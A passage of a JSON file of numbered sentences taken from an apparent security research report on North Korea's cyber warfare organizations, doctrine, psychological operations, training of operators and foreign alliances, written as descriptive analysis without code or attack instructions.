to the NDC or its chairman 's decisions and directives .", "3962": "\uf0b7 The power to create or remove central organs of the national defense sector .", "3963": "\uf0b7 The power to create and bestow military titles above general-grade officer rank .", "3964": "The NDC oversees several defense and intelligence bodies including the Ministry of State Security , the Ministry of People 's Security , the Ministry of People 's Armed Forces , and the Korean People's Army .", "3965": "The Ministry of State Security ( MSS ) , also known as the State Security Department , is North Korea 's primary counterintelligence service .", "3966": "It is considered an autonomous agent of the regime and reports directly to leader Kim Jong Un .", "3967": "The MSS 's duties include oversight of North Korean prison camps , investigation of domestic espionage , repatriation of defectors , and overseas counterespionage operations .", "3968": "The Ministry of People 's Security is also known as the Ministry of Public Security ( MPS ) .", "3969": "Focused on domestic order , it oversees North Korea 's national police force , conducts criminal investigations and preliminary examinations , and oversees correctional facilities , excluding prison camps .", "3970": "While the roles of the MSS and MPS focus more on intelligence than on cyber operations , the MSS also reportedly has a communications monitoring and computer hacking group .", "3971": "The Ministry of People 's Armed Forces ( MPAF ) administrates the Korean People 's Army ( KPA ) and oversees the General Staff Department ( GSD ) , which is responsible for operational command and control of North Korea 's armed forces .", "3972": "The General Staff Department also oversees the Reconnaissance General Bureau ( RGB ) , North Korea 's agency for clandestine operations .", "3973": "The RGB has a role in both traditional and cyber operations .", "3974": "In the past , the RGB has sent agents on overseas military assistance missions to train insurgent groups .", "3975": "The RGB reportedly has a special operations forces ( SOF ) element and oversees six bureaus that specialize in operations , reconnaissance , technology and cyber matters , overseas intelligence collection , inter-Korean talks , and service support .", "3976": "Two of these bureaus have been identified as the No .", "3977": "91 Office and Unit 121 .", "3978": "The No .", "3979": "91 Office , an office responsible for hacking , operates out of the Mangkyungdae-district of Pyongyang .", "3980": "Unit 121 comprises both an intelligence component and an attack component .", "3981": "Unit 121 's headquarters is in the Moonshin-dong area of Pyongyang , near the Taedong River .", "3982": "It also has components that conduct operations from within China .", "3983": "One of Unit 121 's command posts is Chilbosan Hotel in Shenyang , the capital of Liaoning Province , which borders North Korea .", "3984": "Shenyang is a Chinese military district .", "3985": "According to Dr. Alexandre Mansourov , an expert on North Korea and a visiting scholar at the U.S.-Korea Institute at Johns Hopkins University , '' They [ Unit 121 ] are believed to have conducted hacking operations from inside China that falsify classified data and disrupt U.S. and South Korean systems .", "3986": "'' Both Unit 121 and an entity known as Lab 110 are reported to maintain technical reconnaissance teams responsible for infiltrating computer networks , hacking to obtain intelligence , and planting viruses on enemy networks .", "3987": "Several entities are nested under the Workers ' Party .", "3988": "The Central Party Committee oversees the Central Party Investigative Group , also known as Unit 35 .", "3989": "Unit 35 is reportedly responsible for technical education and training of cyber warriors .", "3990": "The Unification Bureau 's Operations Department is responsible for cyber-psychological warfare , organizational espionage , and oversight of Unit 204 .", "3991": "Unit 204 's responsibilities include planning and execution of cyber-psychological warfare operations and technological research .", "3992": "The Psychological Operations Department of the North Korea Defense Commission also engages in cyber-psychological warfare .", "3993": "The 225th Bureau , or Office 225 , is responsible for training agents , infiltration operations in South Korea , and creation of underground political parties in order to incite disorder and revolution .", "3994": "It plays a more traditional intelligence and psychological operations role , rather than focusing on cyber operations .", "3995": "The United Front Department ( UFD ) conducts overt operations to create pro-North Korean groups in South Korea .", "3996": "Examples of this activity include the Korean Asia-Pacific Committee and the Ethnic Reconciliation Council .", "3997": "The UFD also manages inter-Korean dialogue and North Korea's policy toward South Korea .", "3998": "Its operations are also more traditional rather than cyber-focused .", "3999": "The Liaison Department of the Worker 's Party oversees a faction of ethnic North Koreans residing in Japan who are critical to North Korea 's cyber and intelligence programs .", "4000": "This group , which was established in 1955 , is referred to by various names including the Chosen Soren , Chongryon , and the General Association of Korean Residents in Japan .", "4001": "The Chongryon ascribe to juche and seek to preserve North Korean culture while living in Japan .", "4002": "They operate North Korean style schools and refuse to assimilate with Japanese culture .", "4003": "According to Mitsuhiro Suganuma , former section head of the second intelligence department of the Japanese Public Security Intelligence Agency ( PSIA ) , '' Chongryon is virtually under the direct control of the Liaison Department of the Workers ' Party of Korea , which has been in charge of North Korea 's covert operations and underground activities against South Korea .", "4004": "Chongryon in Japan has been a strong support organization aimed at bringing a revolution in South Korea , or a red unification by force .", "4005": "'' He also stated '' North Korea will continue to make Chongryon serve as Pyongyang 's pawn in covert operations against South Korea .", "4006": "'' The Chongryon are vital to North Korea 's military budget , raising funds via weapons trafficking , drug trafficking , and other black market activities .", "4007": "The group also forms '' front companies '' abroad that benefit the regime by generating hard currency .", "4008": "One example is Unikotech , which was formed to sell KCC products abroad .", "4009": "The Chongryon 's underground group known as the Gakushu-gumi , or '' the study group '' , gathers intelligence for North Korea and helps the regime procure advanced technologies .", "4010": "The Chongryon 's role in North Korean intelligence and resource acquisition is discussed below in more detail .", "4011": "The regime also has several government bodies under the Cabinet that oversee its infrastructure , intelligence , and technological development .", "4012": "These include the Central Scientific and Technological Information Agency ( CSTIA ) , the Ministry of Electronics Industry , and the Ministry of Posts and Telecommunications .", "4013": "The CSTIA collects , analyzes , and processes data regarding advanced science and technology then sends relevant information to appropriate areas of the national economy .", "4014": "The amount of information contained in CSTIA's technical database makes it North Korea 's largest scientific facility .", "4015": "According to a CIA article , review of CSTIA 's publications showed that China , Russia , and Japan are important sources of technical data .", "4016": "CSTIA 's publications include newsletters and an 18-volume science and technology reference series .", "4017": "The Ministry of Posts and Telecommunications is the body of oversight for Star Joint Venture Co. North Korea 's cyber warfare doctrine has not been clearly stated .", "4018": "However , based on cultural and technical observations , we may deduce that North Korea 's cyber doctrine follows the tenets of juche nationalism and the songun doctrine .", "4019": "Although North Korea 's limited online presence makes a thorough analysis of their cyber warfare capabilities a difficult task , it must be noted that what is known of those capabilities closely mirrors their kinetic warfare tactics .", "4020": "Cyber warfare is simply the modern chapter in North Korea's long history of asymmetrical warfare .", "4021": "North Korea has used various unconventional tactics in the past , such as guerilla warfare , strategic use of terrain , and psychological operations .", "4022": "The regime also aspires to create viable nuclear weapons .", "4023": "Asymmetrical warfare is defined as '' a conflict in which the resources of two belligerents differ in essence and in the struggle , interact and attempt to exploit each other 's characteristic weaknesses .", "4024": "Such struggles often involve strategies and tactics of unconventional warfare , the 'weaker ' combatants attempting to use strategy to offset deficiencies in quantity or quality '' .", "4025": "According to the aforementioned report to the House Armed Service Committee , '' Cyber warfare is an important asymmetric dimension of conflict that North Korea will probably continue to emphasize - in part because of its deniability and low relative costs .", "4026": "'' North Korea 's poor economic state , further explains the regime 's reliance on these tactics .", "4027": "In 2014 , the regime reportedly spent 16 % of its budget on defense .", "4028": "The North Korean military places a strong emphasis on information warfare capabilities including political and psychological warfare and cyber or hacker warfare .", "4029": "The report by Capt .", "4030": "Duk-Ki Kim , Ph.D. highlighted North Korea 's counter-asymmetric strategy and ranked each based on intensity and frequency : Just ten years ago , experts noted that North Korea was one of the '' least network-ready and most isolated societies on the planet .", "4031": "'' Today North Korea 's air-gapped networks and prioritization of resources for military use provide both a secure and structured base of operations for cyber operations and a secure means of communications .", "4032": "North Korea 's hermit infrastructure creates a cyber-terrain that deters reconnaissance .", "4033": "Because North Korea has few Internet connections to the outside world , anyone seeking intelligence on North Korea 's networks has to expend more resources for cyber reconnaissance .", "4034": "A 2003 article by the U.S. Office of the National Counterintelligence Executive assessed that '' Development of the nation , rather than empowerment of the individual , appears to be driving DPRK efforts to develop domestic IT infrastructure and industry .", "4035": "'' In November 2013 , Kim Jong Un referred to cyber warfare capabilities as a '' magic weapon '' in conjunction with nuclear weapons and missiles .", "4036": "According to Kim Heung-kwang , a North Korean defector and former computer science professor , the regime has the following motivations for expanding its cyber warfare capabilities : \uf0b7 Cyber capabilities are a cost-effective way to offset North Korea 's lack of kinetic military prowess .", "4037": "\uf0b7 North Korea 's school systems place a strong emphasis on math , giving the nation confidence in its programmers , cryptographers , and security researchers .", "4038": "\uf0b7 In the modern warfare landscape , cyber capabilities are potentially more utilitarian than heavy artillery or aircraft .", "4039": "\uf0b7 Cyber warfare capabilities provide a platform for espionage , psychological operations , and other forms of non-kinetic warfare .", "4040": "\uf0b7 Considering the separatist nature of North Korea 's infrastructure , cyber warfare provides a strategic advantage since outbound attacks are possible , but inbound attacks would have limited reach .", "4041": "\uf0b7 Cyber warfare allows North Korea to leverage the Internet 's inherent flaws for offensive purposes while maintaining its defenses , primarily via air-gapping its most critical networks from the outside world .", "4042": "North Korea 's attack and defense capabilities reportedly include the following cyber warfare and electronic warfare components : offensive cyber operations ( OCO ) ; computer network operations ( CNO ) , which includes both computer network attack ( CNA ) and computer network exploitation ( CNE ) ; distributed denial of service ( DDoS ) ; satellite monitoring ; drones ; GPS jamming capabilities ; and deployment of electromagnetic pulse ( EMP ) .", "4043": "North Korea 's OCO and CNO capabilities became apparent as early as 2004 , when North Korea reportedly gained access to 33 of 80 South Korean military wireless communication networks .", "4044": "In June 2006 , an attack on the U.S. State Department originating in the East Asia-Pacific region coincided with U.S.-North Korea negotiations over the regime 's nuclear missile testing .", "4045": "A month later , a South Korean military report implicated North Korea 's Unit 121 in hacking the South Korean and U.S. Defense Departments .", "4046": "North Korea also tested a logic bomb in October 2007 .", "4047": "A logic bomb is malicious code programmed to execute based on a pre-defined triggering event .", "4048": "Following the logic bomb test , the UN passed a resolution banning sales of certain computer hardware to North Korea .", "4049": "North Korea considers its cyber warfare capabilities an important asymmetric asset in the face of its perceived enemies , the U.S. and South Korea .", "4050": "While North Korea does not have an immersive digital culture , both the U.S. and South Korea are heavily dependent upon technological infrastructure for social , economic , and political stability .", "4051": "For this reason , a cyber attack that cripples or compromises the reliability of the U.S. or South Korea 's technological infrastructure could have a far-reaching impact .", "4052": "North Korea has reportedly used computer games for both illegal capital gain and orchestrating cyber attacks .", "4053": "In 2011 , South Korean police arrested five individuals , including one Chinese national , for allegedly collaborating with North Korean hackers affiliated with the Korea Computer Center to steal money via online games .", "4054": "According to South Korean reports , the culprits used an auto-player to quickly progress in the massively multiplayer online role-playing game ( MMORPG ) '' Lineage '' and were able to use the game 's market to obtain real currency .", "4055": "In 2013 , South Korean officials released information stating they had found evidence that North Korea was using games as a medium for infecting machines and launching cyber attacks .", "4056": "North Korea had used game downloads to infect 100,000 South Korean machines for a botnet used to launch a distributed denial of service ( DDoS ) attack against Incheon Airport .", "4057": "This clever tactic sought to leverage a seemingly innocent game as a force multiplier in order to amplify the effects of a DDoS attack on a critical infrastructure target .", "4058": "However , in this case , there was little impact on the target .", "4059": "North Korea 's intelligence program is one of its strongest military assets , providing foundational support for all other military operations .", "4060": "The regime 's cyber warfare capabilities , in particular , rely heavily on open-source intelligence ( OSINT ) collection and cyber-espionage .", "4061": "As noted in a CIA publication , '' It is a significant irony of our information age that open-source intelligence is contributing to the survival and development of one of the world 's most secretive regimes .", "4062": "'' Historically , the primary goals of the regime 's intelligence program included collection and dissemination of intelligence concerning any possible political , military , or economic threat to the regime 's security and stability .", "4063": "Secondary goals have included '' acquisition of foreign military and civilian technologies and equipment , support of the DPRK 's foreign policy goals , training and support for foreign revolutionary and terrorist organizations , and the acquisition of foreign capital for state and intelligence operations .", "4064": "'' North Korea has a broad reach for intelligence collection , which extends to cyber intelligence .", "4065": "In April 2013 , Solutionary , a company providing managed security services , reported a marked increase in both overt attacks and information gathering attempts originating from North Korean IPs .", "4066": "Solutionary refers to any overt external attacks on company networks or attempts to steal data as '' touches .", "4067": "'' They reportedly recorded 12,473 of these touches in February 2013 , 11,000 of which were directed at a single financial institution .", "4068": "As a baseline , Solutionary noted that typically only 200 incidents per month are traced to North Korean origin .", "4069": "This is an interesting claim , considering that attacks attributed to North Korea are usually routed through other countries .", "4070": "As mentioned above , a faction of ethnic North Koreans residing in Japan , known as the Chongryon , are critical to North Korea 's cyber and intelligence programs and help generate hard currency for the regime .", "4071": "The Chongryon headquarters has been recognized as the de facto North Korean embassy in Japan .", "4072": "In 2012 , the organization 's headquarters was seized to pay for the group's past due debts .", "4073": "It was then purchased by a monk named Ekan Ikeguchi , who let the Chongryon continue to use the building in what he referred to as a '' goodwill gesture '' .", "4074": "Ikeguchi is one of the Chongryon's many ties to organized crime .", "4075": "Ikeguchi was arrested in the past for an attempted coup against the Japanese government .", "4076": "He also has ties to the political group Nihon Seinensya , which is involved in illegal activities in conjunction with the yakuza syndicate Sumiyoshi-kai , which imports and sells amphetamines made in North Korea .", "4077": "North Korea also has black market ties to Sumiyoshi-kai's rival syndicate , Yamaguchi-gumi .", "4078": "Many members of the Kodo-kai , Yamaguchi-gumi 's ruling faction , are Korean-Japanese , with ties to North Korea .", "4079": "Masahiro Namikawa , leader of the drug trafficking Seido-kai yakuza organization , also has ties to the Chongryon .", "4080": "The Chongryon operate at least two websites , chongryon.com , which is in Japanese , and korea- np.co.jp .", "4081": "WHOIS records for chongryon.com indicate that it was registered by '' guanin o '' using the email address park2 @ mac.com .", "4082": "The WHOIS information for korea-np.co.jp .", "4083": "shows that it was registered by Choson Shinbo Company Inc .", "4084": "The WHOIS records for these sites can be found in Appendix A. Additionally , the Chongryon operate a ferry called the Mangyongbong-92 , the only direct transit from Japan to North Korea .", "4085": "In 2003 , they were suspected of using the ferry to smuggle missile parts .", "4086": "In 2006 , the ferry was temporarily banned from Japanese waters when Japanese officials discovered the Chongryon were using it to smuggle dual-use electronics to North Korea to be used for military purposes .", "4087": "North Korea has a global network of state-run businesses located in 30 to 40 countries that is used for espionage activities .", "4088": "The Reconnaissance General Bureau is responsible for oversight of this network .", "4089": "The businesses include cafes and other non-suspect establishments .", "4090": "The highest concentration of these is in China .", "4091": "Members of this espionage network reportedly '' send more than $ 100 million in cash per year to the regime and provide cover for spies .", "4092": "'' These establishments are also used for money laundering and drug trafficking .", "4093": "The regime is also known to kidnap foreign citizens and use them as instruments for intelligence .", "4094": "Prisoners are first tortured and psychologically conditioned to bend to the regime 's will .", "4095": "They are then used based on their skillset .", "4096": "This may include teaching their language to North Koreans , spreading propaganda in their native language , providing translation services , conducting military training , or other skills the regime deems useful .", "4097": "In July 2014 , Japanese officials agreed to lift some sanctions on North Korea when the regime agreed to investigate the whereabouts of Japanese citizens who were allegedly abducted by North Korean agents decades ago .", "4098": "Sanctions to be lifted include the ban on port calls to Japan by North Korean ships .", "4099": "North Korea has also infiltrated important positions in South Korea for both intelligence and psychological operations purposes .", "4100": "In 2011 , South Korea 's National Intelligence Service reportedly discovered the presence of Communist spies .", "4101": "These spies within their trusted circles had been reporting back to North Korea for almost 10 years .", "4102": "The embedded spies included a Democratic Party representative .", "4103": "According to the agency , the spies were on a mission to infiltrate and influence the Democratic Party and to gather military intelligence .", "4104": "The regime also attempts to infiltrate organizations made up of North Koreans who seek shelter in South Korea , in order to gain intelligence .", "4105": "In the past several years , South Korea has arrested at least 14 defectors who were found to be spies .", "4106": "These intelligence collection and counterintelligence capabilities are an attempt to provide the regime with a strategic asymmetrical advantage .", "4107": "The regime leverages its human and cyber resources around the globe to provide an influx of intelligence , while very little credible intelligence about the regime 's activities and capabilities ever becomes available to the outside world .", "4108": "North Korea continues to be a master of propaganda and deception and leverages the cyber realm for psychological operations .", "4109": "Modern North Korean psychological operations tactics include distribution of propaganda via traditional media outlets , websites , and social media .", "4110": "Many of these psychological operations campaigns are politically focused .", "4111": "According to Dr. Andrei Lankov , the North Korean government has '' very rational and highly successful manipulators who usually get what they want by outsmarting everybody else in the process .", "4112": "'' The regime 's Unit 204 is responsible for cyber-psychological operations .", "4113": "These operations are PSYOP tailored for the cyber arena .", "4114": "In order to be successful , cyber- psychological campaigns require speed , precision , and creativity .", "4115": "These campaigns leverage the phenomenon of viral , unverified news stories that tend to rapidly propagate via social media , mobile text messaging , and other electronic communications .", "4116": "This phenomenon creates an arena for strategic propagation of both fact and fiction for the purposes of sentiment manipulation .", "4117": "Such messages may be used for recruitment , cyber mobilization , and to instill fear in a target population .", "4118": "Cyber-psychological operations may also include mental suggestion using technology as a delivery mechanism for subliminal cues .", "4119": "It is unknown whether North Korea possesses this capability .", "4120": "North Korean citizens have access to state-approved social networks on the Kwangmyong .", "4121": "The regime has a limited overt social media presence on the Internet .", "4122": "Some of the known social media platforms employed by the regime include Twitter , Facebook , and YouTube .", "4123": "The YouTube channel North Korea Today , operated by user rodrigorojo1 , features news clips from North Korea .", "4124": "It is unclear whether this channel is officially sanctioned .", "4125": "The North Korea Today YouTube channel also has corresponding profiles on Twitter and Facebook .", "4126": "The Uriminzokkiri website , known for pushing juche ideology and anti-American and anti-South Korean messages , has accompanying social media profiles on YouTube , Google+ , and Facebook .", "4127": "It also has Twitter profiles in both Korean and English .", "4128": "North Korean propaganda is used for several purposes : to enforce the ideals of allies and sympathizers , to frame North Korea in a favorable light to outsiders , to sensationalize the regime 's perceived self-reliance and military prowess , and to shield its own citizens from the outside world .", "4129": "Juche ideology and indoctrination of the regime's youth ensure support of the local population .", "4130": "North Koreans accept military duty as an honor and strive to excel in their service to the regime .", "4131": "In the spirit of juche , the regime uses disinformation to '' hide lapses or tout accomplishments that may have never been achieved .", "4132": "'' Limiting citizen access to the outside world by instituting the Kwangmyong intranet , North Korea ensures its citizens are not exposed to outside information that is counterproductive to citizen indoctrination or in conflict with juche ideals .", "4133": "North Korea portrays the West , particularly the United States , as an enemy .", "4134": "The regime uses this strategy of shifting the population's negative sentiments toward an external entity to keep its citizens ignorant of North Korea 's own economic hardship , regime brutality , and systemic incompetence .", "4135": "For example , prior to Kim Jong Il 's death in 2011 , North Korean media altered photos of their '' Dear Leader '' to make him appear younger and healthier than he really was .", "4136": "This became obvious when the altered photos were compared to those taken by Western media around the same time .", "4137": "According to Dr. Andrei Lankov , '' North Koreans now have a much better understanding of what is going on in the outside than they did before .", "4138": "This is largely thanks to the spread of DVDs and video content in the country , but also because some of them have been to China and talk about what they have seen\u2026many [ of ] them sincerely believe that the United States remains ready to attack at any moment and that Japan is an incurably aggressive place\u2026nearly all of them swallow the official propaganda myths about the Korean War being started by the 'American Imperialists' who invaded them .", "4139": "Hence , they see the outside world as an inherently dangerous place .", "4140": "'' Some human rights groups seek to reach out to North Korean citizens and break them from this isolation .", "4141": "In August 2014 , the New York-based charity Human Rights Foundation sponsored a hackathon in San Francisco called '' Hack North Korea '' to find new ways to get information in , out , and around North Korea .", "4142": "The event brought together many programmers , human rights campaigners , and defectors .", "4143": "North Korea even uses '' trolling '' as a PSYOP tactic .", "4144": "On the Internet , '' trolls '' are users who post messages that are often crass , controversial , inflammatory , or offensive , in order to evoke a strong reaction or influence a reader 's opinion .", "4145": "Often , the motivation for trolling is simply for the troll 's enjoyment .", "4146": "The rude and offensive trolling tactics are in stark contrast to traditional forms of persuasive rhetoric .", "4147": "However , North Korea reportedly utilizes over 200 military intelligence operatives to troll South Korean message boards and social media pages with pro-North Korean sentiments. < /fn > Matt Rhoades , director of the cyberspace and security program at the Truman National Security Project , said , '' North Korea 's cyber-development is almost just a new harassment mechanism for them , a low-cost , asymmetric method to harass its neighbor in the south\u2026 '' Leveraging the cyber and intelligence resources noted above , North Korea 's psychological operations serve an important strategic role .", "4148": "The ability to influence outsiders , while effectively isolating its own population from most outside influence , allows North Korea to remain an enigma .", "4149": "Additionally , in line with its PSYOP tactics , North Korea may strategically take credit for cyber attacks that were , in reality , launched by another entity .", "4150": "Whether the targeted entity blames North Korea for the attacks , or the regime simply takes credit for an attack that has not yet been attributed , several PSYOP goals can come into play .", "4151": "First , to claim credit for an attack amplifies the impact of a show of force , particularly if South Korea is the target .", "4152": "This tactic can be used to stir sentiments in order to provoke a reaction .", "4153": "Second , North Korea may lay claim to responsibility for an attack that exceeds its capabilities in order to seem more technologically advanced and more capable .", "4154": "Third , any success , or the appearance thereof , enforces the juche ideal of regime self-sufficiency .", "4155": "Finally , North Korea may act as a scapegoat and claim credit for a cyber attack of an ally such as China so the attack is not attributed to the real actors .", "4156": "North Korea reportedly has the electronic warfare capabilities to jam GPS and to inject false GPS coordinates .", "4157": "North Korea demonstrated these capabilities in March 2011 by jamming South Korea 's GPS signals during a joint U.S.-South Korea military exercise .", "4158": "North Korea has the capability to create an EMP .", "4159": "An EMP is a sudden , extreme outburst of atmospheric electricity creating an intense magnetic field that can burn out electrical equipment .", "4160": "A report from the U.S. Department of Homeland Security ( DHS ) noted North Korea 's ability to deliver a nuclear warhead as a satellite over the South Pole , effectively creating the burst needed to deliver an EMP targeting the United States .", "4161": "An EMP could effectively disrupt electronic communications including critical infrastructure components such as telecommunications , financial institutions , the energy sector , transportation , food and water delivery , emergency services , and space systems .", "4162": "North Korea reportedly acquired its EMP technology from Russia .", "4163": "North Korea also has a drone program .", "4164": "The regime reportedly acquired its first drones in the late 1980 's or early 1990 's .", "4165": "The regime 's drones are complimentary to its intelligence program and are primarily used for surveillance .", "4166": "In early 2014 a North Korean drone crashed south of the 38th parallel , the line dividing North Korea from the south .", "4167": "While early reports noted that the drones appeared similar to those manufactured by Chinese company Tauyuan Navigation Friend Aviation Technology , the company denied involvement .", "4168": "Stressing the importance of the regime 's electronic warfare capabilities , in 1999 former regime leader Kim Jong Il said '' The basic key to victory in modern warfare is to do well in electronic warfare .", "4169": "'' Since the regime 's advanced technology lags behind that of South Korea and the U.S. , its capability to disrupt the communications of these perceived adversaries is a vital asymmetric capability .", "4170": "North Korea utilizes primary and secondary education and the university system to train its cyber warfare operators .", "4171": "According to reports by defectors , the regime seeks out children who show mathematical talent and sends them through rigorous advanced training .", "4172": "A vintage North Korean animation stresses the importance of mathematics in North Korean education .", "4173": "The short film follows a young boy as he does his geometry homework .", "4174": "The frustrated boy begins to daydream then has visions of going to war with the U.S. and needing geometry to effectively calculate missile trajectory during the battle .", "4175": "Science and technology students are expected to learn foreign languages , which may include Chinese , Japanese , and English.233 Student emails , chats , and web browsing activities are heavily monitored .", "4176": "Around age twelve or thirteen , chosen students are enrolled in accelerated computer courses at First and Second Geumseong Senior-Middle Schools .", "4177": "The successful students are then sent to Kim Il-sung University , Kim Chaek University of Technology , or the Command Automation University , traditionally known as Mirim University .", "4178": "Kim Il-sung University 's computer center was started in 1985 .", "4179": "Its computer courses have a heavy programming element .", "4180": "The university reportedly developed the Intelligent Locker hard disc protection program , Worluf Antivirus , SIMNA ( simulation and system analysis program ) , a war games program , a hepatitis diagnosis and prescription system , and a C++ program development tool called FC 2.0 .", "4181": "Kim Il-sung University also has programs focusing on nuclear research .", "4182": "Kim Chaek University of Technology was established in 1948 .", "4183": "In the late 1990s , it began to restructure its computer-focused courses to reflect more modern technologies .", "4184": "As of 2002 , the university had three colleges focusing on computer science , information science and technology , and machine science .", "4185": "Software developed by the university includes Computer Fax and SGVision , an image-reprocessing program used for steganography .", "4186": "Students and instructors must submit a formal request for permission in order to use the Internet for research .", "4187": "The Command Automation University periodically chooses around 100 students for an intensive five-year course prior to their assignment to serve in cyber intelligence and cyber warfare capacities .", "4188": "Programs at the Command Automation University include command automation , computers , programming , automated reconnaissance , and electronic warfare .", "4189": "Other students attend a two-year accelerated university program , then study abroad in Russia or China before they are assigned to a cyber-operator role .", "4190": "The elite cyber operators are given special incentives .", "4191": "For example , parents of students graduating from the cyber program with top scores are given the opportunity to live in Pyongyang ; and married cyber operators are given housing , a food allowance , and a stipend if operating overseas .", "4192": "Due to the nature of their profession , these cyber elite are some of the only North Koreans allowed to access the outside Internet .", "4193": "While this report focuses on North Korea 's cyber warfare capabilities , these capabilities can not be fully separated from the implications of partnerships with countries known to deal in illegal weapons trade with the regime .", "4194": "Now that cyberspace has become a legitimate arena for warfare , these nations are also potential allies in the cyber realm .", "4195": "For this reason , the regime 's key political and military relationships are explored below .", "4196": "North Korea has a longstanding historical relationship with China .", "4197": "During the Korean War ( 1950- 1953 ) , China allied with North Korea 's Communist forces .", "4198": "China has also provided ongoing political and economic support to the regime 's leadership and is a primary trade partner .", "4199": "North Korea is economically dependent on China .", "4200": "North Korea gets an estimated 90 percent of its energy imports , 80 percent of its consumer goods , and 45 percent of its food supply from China .", "4201": "This relationship is prudent \u2013 in the event of a military conflict , China can strategically use North Korea as a buffer zone between itself and South Korea , where many U.S. military personnel are stationed .", "4202": "Chinese aid to North Korea also deters the likelihood that the regime will collapse , resulting in internal destabilization that could catalyze a U.S.-China conflict .", "4203": "North Korea relies heavily on China for technological resources .", "4204": "As noted above , North Korea relies on China 's Unicom for Internet access .", "4205": "Additionally , the regime sends some of its cyber warriors to train in China and stations a portion of its Unit 121 personnel in Shenyang .", "4206": "Some of North Korea 's official websites are hosted in China , and KCC has a branch office there .", "4207": "North Korea also relies on China to provide much of its network hardware , including servers and routers .", "4208": "North Korea has a long history of ties to Russia .", "4209": "The former Soviet Union was the major sponsor of the North Korean state and a major trading partner .", "4210": "Following the dissolution of the Soviet Union , aid to North Korea was halted and trade diminished significantly .", "4211": "This chain of events contributed to North Korea 's eventual economic collapse , as it could not survive without aid .", "4212": "North Korea currently has a collaborative relationship with Russia in the cyber realm .", "4213": "The regime's CSTIA relies on Russia as one of several sources for technical data .", "4214": "North Korea also sends some of its cyber warriors to train in Russia , and the regime reportedly acquired its EMP technology from there .", "4215": "Political ties between Russia and North Korea have become stronger in recent months .", "4216": "In 2014 , potentially as a result of the U.S. response to the Russian-Ukranian conflict , Russia began to strengthen ties with North Korea .", "4217": "Negotiations reportedly included promises of trade and development projects .", "4218": "Narushige Michishita , a North Korea and Asia security expert at Japan's National Graduate Institute for Policy Studies , stated '' By strengthening its relationship with North Korea , Russia is trying to enhance its bargaining position vis-\u00e0-vis the United States and Japan .", "4219": "'' Russia also recently forgave most of the regime 's debts .", "4220": "North Korea and Iran have longstanding political and military ties .", "4221": "North Korea supplied Iran with conventional arms during the Iran-Iraq War .", "4222": "Iran and North Korea reportedly collaborate closely in ballistic missile development efforts .", "4223": "In the past , Iran provided the North Korean regime with necessary funds and oil in exchange for missile parts and technology .", "4224": "In 2009 , a North Korean plane transporting 35 tons of weapons and allegedly bound for Iran was seized after making an unscheduled stop in Bangkok , Thailand .", "4225": "That same year , United Arab Emirates seized a ship bound for Iran that was transporting several containers of North Korean weapons , including rocket-propelled grenades and ammunition .", "4226": "Reportedly , the customer was a company affiliated with Iran 's Islamic Revolutionary Guard Corps .", "4227": "North Korea also has cyberwar ties with Iran .", "4228": "In 2012 , North Korea and Iran signed a technology treaty to help combat '' common enemies '' in cyberspace .", "4229": "The treaty included provisions for cooperation in research , student exchanges , and joint laboratories .", "4230": "Joint projects reportedly include IT information sharing , engineering , biotechnology , renewable energy , and sustainability .", "4231": "F-Secure 's Mikko Hypponen stated , '' It 's highly likely that one of the reasons for this co-operation is for them to work together regarding their cyber defence and cyber offense strategies '' .", "4232": "Hypponen cited Flame malware as a possible triggering event for the creation of this treaty .", "4233": "Others also suspect that Iran and North Korea 's mutual interest in development of nuclear weapons and the need to protect refineries against malware such as Stuxnet were driving factors in the establishment of the treaty .", "4234": "U.S. House Foreign Affairs Committee leaders assert that the treaty indicates North Korea and Iran are collaborating on a joint nuclear weapons program .", "4235": "Additionally , North Korea , in conjunction with Iran and Syria , reportedly supports both Hamas and Hezbollah in procuring kinetic weaponry and communications equipment and in establishing operational infrastructure .", "4236": "North Korea has both a cyber relationship and kinetic weapons ties with Syria .", "4237": "KCC reportedly has a branch in Syria .", "4238": "In 2007 , Israel launched an airstrike , destroying a Syrian target that was allegedly a nuclear facility under construction with North Korea 's assistance .", "4239": "U.S. officials noted the facility was modeled on the North Korean nuclear reactor at Yongbyon .", "4240": "The North Korea-Syria relationship becomes more important in the context of both countries ' ties with Iran .", "4241": "As noted above , Iran , North Korea , and Syria jointly provide support to extremist groups Hamas and Hezbollah .", "4242": "Additionally , as we explored in HPSR Security Briefing Episode 11 , Iran and Syria 's military alliances extend to joint SIGINT and cyber operations .", "4243": "North Korea also has an interesting relationship with Cuba \u2013 one that includes supplying weapons and apparent attempts to illegally smuggle weapons .", "4244": "In 2013 , a North Korean cargo ship on its return voyage was stopped near the Panama Canal .", "4245": "The ship was carrying surface-to-air missile parts , disguised as containers of sugar .", "4246": "In an attempt to save face , Cuba 's Ministry of Foreign Affairs stated that the cargo included '' 240 metric tons of obsolete defensive weapons -- two anti- aircraft missile complexes Volga and Pechora , nine missiles in parts and spares , two Mig-21 Bis and 15 motors for this type of airplane , all of it manufactured in the mid-20th century -- to be repaired and returned to Cuba .", "4247": "'' Experts said the cargo appeared to include a SNR-75 Fan Song fire-control radar system for an SA-2 missile , a Soviet-era missile system that was also used in Cuba .", "4248": "Following the incident , Fidel Castro credited former North Korean leader Kim Il-Sung for providing Cuba with weapons near the end of the Cold War .", "4249": "Weapons included 100,000 AK rifles and necessary ammunition .", "4250": "While no apparent cyber relationship exists between North Korea and Cuba at this time , their track record for weapons trade means the potential for future collaboration in the cyber realm can not be discounted .", "4251": "\uf0b7 North Korea gains access to 33 South Korean military wireless communication networks \uf0b7 The U.S. State Department is attacked by entities in the East Asia-Pacific region .", "4252": "The attacks coincided with State Department negotiations with North Korea regarding the regime 's nuclear missile tests .", "4253": "( June ) \uf0b7 A South Korean military official states North Korea 's Unit 121 has breached South Korean and U.S. military entities .", "4254": "( July ) \uf0b7 North Korea states that it is '' fully ready for any form of high-tech war .", "4255": "'' ( June ) \uf0b7 DarkSeoul DDoS and disk wiping malware targeting South Korean and U.S. government , media outlet , and financial websites .", "4256": "These attacks also coincided with U.S .", "4257": "Independence Day .", "4258": "( July ) \uf0b7 Malware for '' Operation Troy '' was likely planted .", "4259": "It is interesting to note that much of North Korea 's cyber activity follows a distinct pattern .", "4260": "Analysis of North Korean cyber activity gives insight into these patterns and also helps tie together North Korea 's strategic , tactical , and operational capabilities .", "4261": "Strategic capabilities refer to the assets used in support of a long-term , overarching goal .", "4262": "Tactical capabilities refer to the methods and maneuvers actually implemented in pursuit of the strategic goal .", "4263": "Operational capabilities refer to the potential use of these capabilities .", "4264": "In 2004 , in response to the annual U.S. \u2013 South Korea joint military exercises , North Korea reportedly gained access to 33 South Korean military wireless communication 